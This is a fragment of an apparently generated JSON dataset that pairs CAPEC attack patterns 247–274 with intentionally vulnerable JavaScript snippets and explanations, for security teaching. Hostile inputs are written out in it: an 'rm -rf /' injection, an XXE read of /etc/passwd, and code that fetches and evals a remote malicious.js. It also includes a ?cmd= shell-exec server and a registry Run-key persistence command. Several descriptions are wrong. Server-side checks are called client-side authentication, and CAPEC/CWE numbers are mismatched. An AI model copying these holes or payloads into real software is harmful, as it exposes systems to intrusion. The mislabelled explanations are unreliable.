        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "<html>\n<body>\n  <img src=\"javascript:alert('XSS')\">\n  <script>\n    var userInput = \"<img src=\\\"javascript:alert('XSS')\\\">\";\n    document.write(userInput);\n  </script>\n</body>\n</html>",
        "description": "This code snippet demonstrates a vulnerability related to Cross-Site Scripting (XSS) using an IMG tag with a JavaScript payload in the 'src' attribute. The 'userInput' variable contains a malicious IMG tag that triggers an alert when rendered. The 'document.write' function is used to inject this user-controlled input directly into the HTML, which is a common XSS vector. This example highlights CWE-82 (Improper Neutralization of Script in Attributes of IMG Tags in a Web Page) and CWE-87 (Improper Neutralization of Alternate XSS Syntax). The code also indirectly touches on CWE-692 (Incomplete Denylist to Cross-Site Scripting) by not properly sanitizing the input, allowing the XSS attack to succeed."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "const userInput = \"<script>alert('XSS');</script>\\0\";\nconst sanitizedInput = userInput.replace(/<script.*?>.*?<\\/script>/gi, '');\ndocument.getElementById('output').innerHTML = sanitizedInput;",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an adversary can insert invalid characters (in this case, a null character '\\0') to bypass input filtering and execute a cross-site scripting (XSS) attack. The `userInput` contains a script tag with an alert function, followed by a null character. The `sanitizedInput` attempts to remove script tags using a regular expression, but the presence of the null character may cause the filter to fail, allowing the script to be executed when inserted into the DOM. This represents the CAPEC 'XSS Using Invalid Characters' and highlights related CWEs such as improper neutralization of invalid characters (CWE-86) and improper neutralization of script-related HTML tags (CWE-80)."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "const { exec } = require('child_process');\n\nfunction executeCommand(userInput) {\n  // Vulnerable to command injection\n  exec(`ls ${userInput}`, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`Error: ${error.message}`);\n      return;\n    }\n    if (stderr) {\n      console.error(`Stderr: ${stderr}`);\n      return;\n    }\n    console.log(`Stdout: ${stdout}`);\n  });\n}\n\n// Example usage\nexecuteCommand(''); // Safe input\nexecuteCommand('&& rm -rf /'); // Malicious input",
        "description": "This JavaScript code snippet demonstrates a command injection vulnerability. The `executeCommand` function takes user input and directly incorporates it into an `exec` call to list directory contents using the `ls` command. This is vulnerable to command injection because the user input is not properly sanitized or validated, allowing an attacker to inject arbitrary commands. For example, an attacker could input `&& rm -rf /` to delete the root directory. This snippet embodies the main idea of CAPEC-88 (Command Injection) and related CWEs, such as CWE-77, CWE-78, and CWE-88, by showing how improper neutralization of special elements in command construction can lead to severe security issues."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "const http = require('http');\nconst { exec } = require('child_process');\n\nhttp.createServer((req, res) => {\n  const userInput = req.url.split('?cmd=')[1];\n  if (userInput) {\n    exec(userInput, (error, stdout, stderr) => {\n      if (error) {\n        res.writeHead(500, { 'Content-Type': 'text/plain' });\n        res.end(`Error: ${error.message}`);\n        return;\n      }\n      res.writeHead(200, { 'Content-Type': 'text/plain' });\n      res.end(stdout);\n    });\n  } else {\n    res.writeHead(400, { 'Content-Type': 'text/plain' });\n    res.end('No command provided');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that listens for incoming requests. It extracts a command from the URL query parameter 'cmd' and executes it using the 'exec' function from the 'child_process' module. The output of the command is then sent back to the client. This code is vulnerable to OS Command Injection (CWE-78) because it directly uses user input to construct and execute a command without proper sanitization or neutralization of special elements. This embodies the main idea of the deprecated CAPEC 'Linux Terminal Injection' and highlights the risks associated with improper handling of user input in command execution."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst xml2js = require('xml2js');\nconst app = express();\napp.use(bodyParser.text({ type: 'application/xml' }));\n\napp.post('/xml', (req, res) => {\n  const xml = req.body;\n  xml2js.parseString(xml, (err, result) => {\n    if (err) {\n      res.status(400).send('Invalid XML');\n      return;\n    }\n    const userInput = result.user.input[0];\n    const query = `//users/user[name='${userInput}']`;\n    // Simulate an XML database query\n    const fakeXmlDatabase = `<users><user><name>admin</name><password>secret</password></user></users>`;\n    xml2js.parseString(fakeXmlDatabase, (err, dbResult) => {\n      if (err) {\n        res.status(500).send('Server Error');\n        return;\n      }\n      const xpath = require('xpath'), dom = require('xmldom').DOMParser;\n      const doc = new dom().parseFromString(fakeXmlDatabase);\n      const nodes = xpath.select(query, doc);\n      if (nodes.length > 0) {\n        res.send(`User found: ${nodes[0].firstChild.data}`);\n      } else {\n        res.send('User not found');\n      }\n    });\n  });\n});\n\napp.listen(3000, () => console.log('Server running on port 3000'));",
        "description": "This JavaScript code snippet demonstrates a vulnerable XML Injection scenario using an Express.js server. The server accepts XML input from a POST request, parses it, and constructs an XPath query using user-controllable input without proper validation or neutralization. This allows an attacker to inject malicious XPath expressions, potentially accessing unauthorized data. The code highlights the risks associated with improper input validation (CWE-20), improper neutralization of special elements (CWE-74, CWE-91, CWE-707), and XPath Injection (CWE-643)."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Vulnerable function to include local code\nfunction includeLocalCode(filePath) {\n  // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n  const fullPath = path.join(__dirname, filePath);\n  if (fs.existsSync(fullPath)) {\n    // CWE-913: Improper Control of Dynamically-Managed Code Resources\n    const code = fs.readFileSync(fullPath, 'utf-8');\n    eval(code); // CWE-506: Embedded Malicious Code\n  } else {\n    console.error('File does not exist:', fullPath);\n  }\n}\n\n// Example usage\nincludeLocalCode('userInput.js');",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that includes and executes local code files based on a provided file path. The function 'includeLocalCode' constructs a full path to the file using the provided 'filePath' and reads the file's content if it exists. It then uses 'eval' to execute the code, which can lead to several security issues. This snippet embodies the main idea of CAPEC-228 (Local Code Inclusion) by allowing an attacker to load and execute arbitrary code files from the local machine. The related CWEs are represented as follows: CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) by accepting a file path from an untrusted source, CWE-913 (Improper Control of Dynamically-Managed Code Resources) by reading and executing the file content without proper validation, and CWE-506 (Embedded Malicious Code) by potentially executing malicious code embedded in the included file."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  const filePath = queryObject.file;\n\n  if (filePath) {\n    fs.readFile(filePath, 'utf8', (err, data) => {\n      if (err) {\n        res.writeHead(404, {'Content-Type': 'text/plain'});\n        res.end('File not found');\n      } else {\n        res.writeHead(200, {'Content-Type': 'text/plain'});\n        res.end(data);\n      }\n    });\n  } else {\n    res.writeHead(400, {'Content-Type': 'text/plain'});\n    res.end('No file specified');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server that reads and serves the content of a file specified by a query parameter in the URL. The server uses the 'fs' module to read the file from the local filesystem. If the file exists, its content is returned to the client; otherwise, a 404 error is returned. This code is vulnerable to Local File Inclusion (LFI) attacks, as it does not properly validate or sanitize the 'file' query parameter. An attacker could exploit this by specifying a path to a sensitive or malicious file on the server, leading to unauthorized file access or execution. This example embodies the main idea of CAPEC-829 and related CWEs, demonstrating how improper control and validation of file paths can lead to security vulnerabilities."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "const http = require('http');\nconst url = 'http://example.com/malicious.js';\n\nhttp.get(url, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    eval(data); // Dangerous: executing code from an untrusted source\n  });\n}).on('error', (err) => {\n  console.error('Error fetching remote script:', err);\n});",
        "description": "This JavaScript code snippet demonstrates a Remote Code Inclusion vulnerability. It fetches a JavaScript file from a remote URL and executes it using `eval()`. This is dangerous because the code being executed is from an untrusted source, which could be malicious. This snippet embodies the main idea of CAPEC-remote code inclusion and highlights related CWEs such as CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) and CWE-494 (Download of Code Without Integrity Check). The use of `eval()` to execute the fetched code without verifying its integrity or origin makes the application vulnerable to attacks."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "const xml2js = require('xml2js');\nconst fs = require('fs');\n\nconst xml = `<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>`;\n\nxml2js.parseString(xml, (err, result) => {\n  if (err) {\n    console.error('Error parsing XML:', err);\n  } else {\n    console.log('Parsed result:', result);\n  }\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability related to DTD Injection (CAPEC-228) and improper control of Document Type Definition (CWE-827). The code uses the 'xml2js' library to parse an XML string that includes an external entity reference. The XML string defines a DTD with an entity 'xxe' that references the local file '/etc/passwd'. When the XML is parsed, the content of '/etc/passwd' is included in the parsed result, potentially exposing sensitive information. This example highlights the risk of allowing arbitrary DTDs in XML parsing, which can lead to information exposure and other security issues."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk;\n  });\n\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n\n      const arraySize = parseInt(result.array.$.size, 10);\n      const arrayData = result.array.item;\n\n      // Vulnerable code: trusting the size attribute without validation\n      let buffer = new Array(arraySize);\n      for (let i = 0; i < arrayData.length; i++) {\n        buffer[i] = arrayData[i];\n      }\n\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('Array processed');\n    });\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server running on port 8080');\n});",
        "description": "This JavaScript code snippet sets up an HTTP server that processes SOAP requests containing an array. The server reads the XML body of the request and parses it using the xml2js library. It then extracts the size of the array from the XML attribute and the actual array data. The code naively trusts the size attribute and allocates a buffer based on this size without validating it against the actual length of the array data. This can lead to a buffer overflow if the actual array length exceeds the specified size, embodying the main idea of the CAPEC 'SOAP Array Overflow'. The related CWEs are represented by the incorrect handling of length parameters and potential buffer overflows."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "const fs = require('fs');\n\n// Simulate a transaction data structure\nlet transaction = {\n  id: 1,\n  amount: 100,\n  status: 'pending'\n};\n\n// Vulnerable code: storing transaction data without protection\nfs.writeFileSync('transaction.log', JSON.stringify(transaction));\n\n// Simulate an attacker modifying the transaction log\nlet modifiedTransaction = JSON.parse(fs.readFileSync('transaction.log'));\nmodifiedTransaction.amount = 1000000; // Attacker modifies the amount\nfs.writeFileSync('transaction.log', JSON.stringify(modifiedTransaction));\n\n// Read the modified transaction\nlet finalTransaction = JSON.parse(fs.readFileSync('transaction.log'));\nconsole.log(finalTransaction);",
        "description": "This JavaScript code snippet demonstrates a deprecated attack pattern related to the abuse of a transaction data structure. The code simulates a transaction object and writes it to a log file without any protection. An attacker can then read and modify the transaction data, changing the amount from 100 to 1000000. This represents the deprecated CAPEC pattern of abusing transaction data structures and highlights related weaknesses such as failure to protect stored data from modification (CWE-217) and information exposure through log files (CWE-532). The code is vulnerable because it does not implement any security measures to protect the integrity and confidentiality of the transaction data."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst server = http.createServer((req, res) => {\n  if (req.method === 'POST' && req.url === '/login') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const { username, password } = JSON.parse(body);\n      // Client-side authentication (CWE-603)\n      if (username === 'admin' && password === 'password123') {\n        const token = crypto.randomBytes(16).toString('hex');\n        res.writeHead(200, { 'Content-Type': 'application/json' });\n        res.end(JSON.stringify({ token }));\n      } else {\n        res.writeHead(401, { 'Content-Type': 'application/json' });\n        res.end(JSON.stringify({ error: 'Unauthorized' }));\n      }\n    });\n  } else {\n    res.writeHead(404, { 'Content-Type': 'application/json' });\n    res.end(JSON.stringify({ error: 'Not Found' }));\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up a basic HTTP server that handles a login request. The server performs client-side authentication by checking the username and password directly in the client code (CWE-603). If the credentials match, it generates a token and sends it back to the client. This setup is vulnerable to capture-replay attacks (CWE-294) because the token can be sniffed and reused by an attacker. The code represents the main idea of the deprecated CAPEC, which involves sniffing and capturing application code during dynamic updates, leading to potential authentication bypass issues."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "const http = require('http');\nconst crypto = require('crypto');\n\nconst server = http.createServer((req, res) => {\n  if (req.url === '/login' && req.method === 'POST') {\n    let body = '';\n    req.on('data', chunk => {\n      body += chunk.toString();\n    });\n    req.on('end', () => {\n      const { username, password } = JSON.parse(body);\n      // Client-side authentication (CWE-603)\n      if (username === 'admin' && password === 'password123') {\n        const token = crypto.randomBytes(16).toString('hex');\n        res.writeHead(200, { 'Content-Type': 'application/json' });\n        res.end(JSON.stringify({ token }));\n      } else {\n        res.writeHead(401, { 'Content-Type': 'application/json' });\n        res.end(JSON.stringify({ error: 'Unauthorized' }));\n      }\n    });\n  } else {\n    res.writeHead(404, { 'Content-Type': 'application/json' });\n    res.end(JSON.stringify({ error: 'Not Found' }));\n  }\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server that handles a login request. The server performs client-side authentication by checking the username and password directly in the client code (CWE-603). If the credentials match, it generates a token and sends it back to the client. This setup is vulnerable to capture-replay attacks (CWE-294) because the authentication relies on static credentials that can be sniffed and replayed by an attacker. The code represents the main idea of the deprecated CAPEC, which involves sniffing and capturing application code during patching, leading to potential security vulnerabilities."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  console.log('Connected');\n  client.write('AUTH user:password'); // Client-side authentication\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  client.destroy(); // Close the connection after receiving data\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\n// Sniffer to capture and replay authentication\nconst sniffer = new net.Socket();\nsniffer.connect(1337, '127.0.0.1', () => {\n  console.log('Sniffer Connected');\n  sniffer.write('AUTH user:password'); // Replay captured authentication\n});\n\nsniffer.on('data', (data) => {\n  console.log('Sniffer Received: ' + data);\n  sniffer.destroy(); // Close the connection after receiving data\n});\n\nsniffer.on('close', () => {\n  console.log('Sniffer Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable client-server authentication mechanism and a sniffer that captures and replays the authentication data. The client connects to a server and sends authentication credentials ('AUTH user:password') directly from the client-side, which is a weak practice (CWE-603: Use of Client-Side Authentication). The sniffer then connects to the same server and replays the captured authentication credentials, successfully bypassing the authentication (CWE-294: Authentication Bypass by Capture-replay). This embodies the main idea of the deprecated CAPEC, which involves passively sniffing and capturing application code or data during initial distribution and using it to bypass authentication."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst bodyParser = require('body-parser');\nconst mysql = require('mysql');\n\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst connection = mysql.createConnection({\n  host: 'localhost',\n  user: 'root',\n  password: '',\n  database: 'test_db'\n});\n\napp.post('/search', (req, res) => {\n  const searchTerm = req.body.searchTerm;\n  const query = `SELECT * FROM users WHERE name = '${searchTerm}'`;\n  connection.query(query, (error, results) => {\n    if (error) {\n      res.status(500).send(`Error: ${error.message}`);\n    } else {\n      res.json(results);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet sets up an Express.js server with a MySQL database connection. It includes a POST endpoint '/search' that takes a 'searchTerm' from the request body and constructs an SQL query to search for users by name. The query is directly constructed using the user input without proper validation or sanitization, making it vulnerable to SQL Injection (CWE-89). Additionally, if an error occurs during the query execution, the error message is sent back to the client, potentially exposing sensitive information (CWE-209). This code exemplifies the CAPEC scenario where an adversary can send modified queries to extract sensitive information or cause unintended behavior."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processFile(filePath) {\n  if (path.extname(filePath) !== '.txt') {\n    throw new Error('Unsupported file type');\n  }\n\n  fs.readFile(filePath, 'utf8', (err, data) => {\n    if (err) {\n      console.error('Error reading file:', err);\n      return;\n    }\n\n    // Simulate processing the file\n    console.log('Processing file:', data);\n  });\n}\n\n// Example usage\nconst userUploadedFile = '/tmp/uploadedFile.txt';\nprocessFile(userUploadedFile);",
        "description": "This JavaScript code snippet demonstrates a vulnerable file processing function that embodies the main idea of the CAPEC 'Force Use of Corrupted Files'. The function `processFile` reads and processes a file based on its extension. It checks if the file extension is '.txt' and then reads the file content. However, this code is vulnerable to several issues: \n1. CWE-646: The code relies on the file extension to determine the file type, which can be spoofed by an attacker.\n2. CWE-377: The example uses a temporary file path (`/tmp/uploadedFile.txt`), which can be insecure and manipulated by an attacker.\n3. CWE-434: The code does not restrict the type of content within the file, potentially allowing dangerous content to be processed.\n\nAn attacker could exploit these weaknesses by uploading a corrupted or malicious file with a '.txt' extension, leading to potential denial of service or other harmful effects when the file is processed."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "const exec = require('child_process').exec;\n\n// CWE-1108: Excessive Reliance on Global Variables\nlet globalEnvVar = process.env.PATH;\n\nfunction runCommand(userInput) {\n  // CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n  let command = `echo ${userInput}`;\n  exec(command, (error, stdout, stderr) => {\n    if (error) {\n      console.error(`exec error: ${error}`);\n      return;\n    }\n    console.log(`stdout: ${stdout}`);\n    console.error(`stderr: ${stderr}`);\n  });\n}\n\n// CWE-1126: Declaration of Variable with Unnecessarily Wide Scope\nlet userInput = process.argv[2];\nrunCommand(userInput);",
        "description": "This JavaScript code snippet demonstrates a vulnerable pattern related to environment variable manipulation and several related CWEs. The code uses the 'exec' function from the 'child_process' module to execute a command that includes user input without proper sanitization, leading to potential command injection (CWE-95). It also relies on a global variable 'globalEnvVar' to store an environment variable (CWE-1108). Additionally, the 'userInput' variable is declared with unnecessarily wide scope (CWE-1126). This code snippet embodies the main idea of CAPEC-13 by showing how improper handling of environment variables and user input can lead to security vulnerabilities."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "var globalVar;\n\nfunction setGlobalVar(value) {\n    globalVar = value;\n}\n\nfunction getGlobalVar() {\n    return globalVar;\n}\n\nfunction manipulateGlobalVar(userInput) {\n    eval('globalVar = ' + userInput);\n}\n\n// Example usage\nsetGlobalVar(10);\nconsole.log(getGlobalVar()); // 10\nmanipulateGlobalVar('20');\nconsole.log(getGlobalVar()); // 20",
        "description": "This JavaScript code snippet demonstrates the vulnerability of excessive reliance on global variables and improper control of dynamically-identified variables. The global variable 'globalVar' is manipulated through various functions, including 'manipulateGlobalVar', which uses the 'eval' function to dynamically set the value of 'globalVar' based on user input. This represents a significant security risk, as an attacker could inject malicious code through the 'userInput' parameter. The code highlights the dangers of using global variables and dynamic evaluation, which can lead to unauthorized access and modification of variables."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "const userInput = \"../../etc/passwd\";\n\nfunction validateInput(input) {\n  const validPattern = /^[a-zA-Z0-9_\\/]+$/;\n  return validPattern.test(input);\n}\n\nfunction canonicalize(input) {\n  const parts = input.split('/');\n  const canonicalParts = [];\n  for (const part of parts) {\n    if (part === '..') {\n      canonicalParts.pop();\n    } else if (part !== '.') {\n      canonicalParts.push(part);\n    }\n  }\n  return canonicalParts.join('/');\n}\n\nif (validateInput(userInput)) {\n  const safePath = canonicalize(userInput);\n  console.log(`Safe path: ${safePath}`);\n} else {\n  console.log('Invalid input');\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where input validation is performed before canonicalization, which can lead to security issues. The `validateInput` function checks if the input matches a specific pattern, but this validation occurs before the `canonicalize` function processes the input to resolve any directory traversal sequences like `..`. As a result, an attacker could bypass the validation by using sequences that are valid initially but become dangerous after canonicalization. This embodies the main idea of the deprecated CAPEC 'Manipulate Canonicalization' and CWE-180 'Incorrect Behavior Order: Validate Before Canonicalize'."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst port = 3000;\n\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/submit', (req, res) => {\n  let userInput = req.body.input;\n  // Validate input before canonicalization\n  if (!/^[a-zA-Z0-9]+$/.test(userInput)) {\n    return res.status(400).send('Invalid input');\n  }\n  // Canonicalize input\n  userInput = decodeURIComponent(userInput);\n  // Use the input in a file path\n  const filePath = `/uploads/${userInput}.txt`;\n  res.send(`File path is: ${filePath}`);\n});\n\napp.listen(port, () => {\n  console.log(`Server running at http://localhost:${port}/`);\n});",
        "description": "This JavaScript code snippet sets up an Express server that handles POST requests to the '/submit' endpoint. The server receives user input, validates it using a regular expression to ensure it only contains alphanumeric characters, and then decodes the input using `decodeURIComponent`. This sequence represents the CAPEC 'Leverage Alternate Encoding' by demonstrating improper handling of alternate encoding (CWE-173) and incorrect behavior order (CWE-180). The validation occurs before canonicalization, which can lead to security issues if the input is maliciously encoded. The code also constructs a file path using the user input, which can be influenced by external control (CWE-73)."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "const fs = require('fs');\nconst logFilePath = '/var/log/app.log';\n\nfunction logEvent(event) {\n  const logEntry = `${new Date().toISOString()} - ${event}\\n`;\n  fs.appendFileSync(logFilePath, logEntry);\n}\n\nfunction manipulateLog() {\n  const maliciousEntry = '2023-10-01T00:00:00.000Z - User login failed: admin\\n';\n  fs.appendFileSync(logFilePath, maliciousEntry);\n}\n\n// Simulate normal logging\nlogEvent('User login successful: user123');\n\n// Simulate log manipulation by an attacker\nmanipulateLog();",
        "description": "This JavaScript code snippet demonstrates a basic logging mechanism and how an attacker might manipulate the log file. The `logEvent` function appends a log entry to a log file, while the `manipulateLog` function appends a malicious log entry. This example highlights the vulnerability described in CAPEC-117: Audit Log Manipulation. The code does not implement proper access controls or output neutralization, making it susceptible to CWE-117 (Improper Output Neutralization for Logs) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The attacker can inject misleading log entries, which can mislead audits or cover tracks of an attack."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "const fs = require('fs');\nconst registryPath = 'HKEY_LOCAL_MACHINE\\Software\\MyApp';\n\n// Insecurely storing sensitive information in the registry\nconst sensitiveData = 'password123';\nfs.writeFileSync(registryPath, sensitiveData, 'utf8');\n\n// Incomplete documentation of program execution\nfunction executeTask() {\n  // Privilege context switching error\n  process.setuid(0); // Switch to root user\n  // Task execution logic here\n  process.setuid(process.env.USER); // Switch back to original user\n}\n\nexecuteTask();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to registry manipulation and associated weaknesses. The code insecurely stores sensitive information (a password) in the registry in cleartext, which is a direct example of CWE-314. Additionally, the function `executeTask` switches privileges to the root user without proper management, representing CWE-270. The code also lacks comprehensive documentation of its execution flow, aligning with CWE-1112. These issues collectively illustrate the main idea of CAPEC-203: Manipulate Application Registry Values."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "const { exec } = require('child_process');\n\n// Vulnerable code: Adding a new entry to the Windows registry run keys\nconst registryKey = 'HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run';\nconst appName = 'MaliciousApp';\nconst appPath = 'C:\\\\path\\\\to\\\\malicious.exe';\n\n// Command to add the registry entry\nconst command = `reg add \"${registryKey}\" /v \"${appName}\" /t REG_SZ /d \"${appPath}\" /f`;\n\nexec(command, (error, stdout, stderr) => {\n  if (error) {\n    console.error(`Error: ${error.message}`);\n    return;\n  }\n  if (stderr) {\n    console.error(`Stderr: ${stderr}`);\n    return;\n  }\n  console.log(`Stdout: ${stdout}`);\n});",
        "description": "This JavaScript code snippet demonstrates how an adversary can add a new entry to the Windows registry run keys, causing a malicious application to execute whenever a user logs in. The code uses Node.js's 'child_process' module to execute a command that modifies the registry. This embodies the CAPEC 'Modification of Registry Run Keys' by showing how an attacker can achieve persistence on a target system. The related CWEs provide additional context, such as the risk of external control of system settings (CWE-15) and the potential for storing sensitive information in cleartext in the registry (CWE-314)."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "const express = require('express');\nconst fs = require('fs');\nconst app = express();\n\n// Load schema from file\nlet schema = JSON.parse(fs.readFileSync('schema.json', 'utf8'));\n\napp.use(express.json());\n\n// Endpoint to update schema\napp.post('/update-schema', (req, res) => {\n  // CWE-15: External Control of System or Configuration Setting\n  schema = req.body.newSchema;\n  fs.writeFileSync('schema.json', JSON.stringify(schema));\n  res.send('Schema updated');\n});\n\n// Endpoint to process data based on schema\napp.post('/process-data', (req, res) => {\n  const data = req.body.data;\n  // Process data based on the schema\n  // CWE-501: Trust Boundary Violation\n  if (schema.validate(data)) {\n    res.send('Data is valid');\n  } else {\n    res.status(400).send('Invalid data');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});",
        "description": "This JavaScript code snippet represents a simple Express.js application that loads a schema from a file and allows users to update this schema via an endpoint. The schema is then used to validate incoming data. The code embodies the concept of Schema Poisoning (CAPEC-153) by allowing external control over the schema (CWE-15), which can lead to trust boundary violations (CWE-501) when the application processes data based on the potentially malicious schema. This can undermine the security of the application, leading to denial of service, unexpected states, or incomplete data recording."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(12345, '127.0.0.1', () => {\n  console.log('Connected to server');\n  client.write('AUTH user:password'); // CWE-301: Simple authentication protocol\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  if (data.toString() === 'AUTH_SUCCESS') {\n    client.write('SENSITIVE_OPERATION'); // CWE-924: No integrity check\n  }\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error: ' + err.message);\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\n// CWE-940: No verification of source\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    console.log('Received: ' + data);\n    if (data.toString().startsWith('AUTH')) {\n      socket.write('AUTH_SUCCESS');\n    } else if (data.toString() === 'SENSITIVE_OPERATION') {\n      console.log('Performing sensitive operation');\n    }\n  });\n});\n\nserver.listen(12345, '127.0.0.1');",
        "description": "This JavaScript code snippet demonstrates a simple client-server communication using the 'net' module. The client connects to the server and sends an authentication message ('AUTH user:password'). If the server responds with 'AUTH_SUCCESS', the client proceeds to send a 'SENSITIVE_OPERATION' message. The server, upon receiving data, checks if it starts with 'AUTH' and responds with 'AUTH_SUCCESS' if it does. If the server receives 'SENSITIVE_OPERATION', it performs a sensitive operation. This code embodies the main idea of CAPEC-272 (Protocol Manipulation) by demonstrating improper verification of the source (CWE-940), lack of message integrity checks (CWE-924), and a simple authentication protocol vulnerable to reflection attacks (CWE-301)."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "const http = require('http');\n\nhttp.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk;\n  });\n  req.on('end', () => {\n    // Vulnerable to HTTP Response Smuggling\n    if (body.includes('\\r\\n')) {\n      res.writeHead(200, { 'Content-Type': 'text/plain' });\n      res.write('HTTP/1.1 200 OK\\r\\n');\n      res.write('Content-Length: 13\\r\\n');\n      res.write('\\r\\n');\n      res.write('Hello, world!');\n      res.write('\\r\\n');\n      res.write('HTTP/1.1 200 OK\\r\\n');\n      res.write('Content-Length: 13\\r\\n');\n      res.write('\\r\\n');\n      res.write('Injected!');\n    } else {\n      res.writeHead(200, { 'Content-Type': 'text/plain' });\n      res.end('Hello, world!');\n    }\n  });\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js that is vulnerable to HTTP Response Smuggling. The server reads the request body and checks if it contains CRLF sequences (\\r\\n). If such sequences are found, it constructs an HTTP response that includes multiple HTTP headers and bodies, effectively injecting a malicious response. This demonstrates CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers) and CWE-444 (Inconsistent Interpretation of HTTP Requests). The code highlights how an attacker can manipulate HTTP responses to inject unauthorized content, leading to potential security issues such as cache poisoning or cross-site scripting (XSS)."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
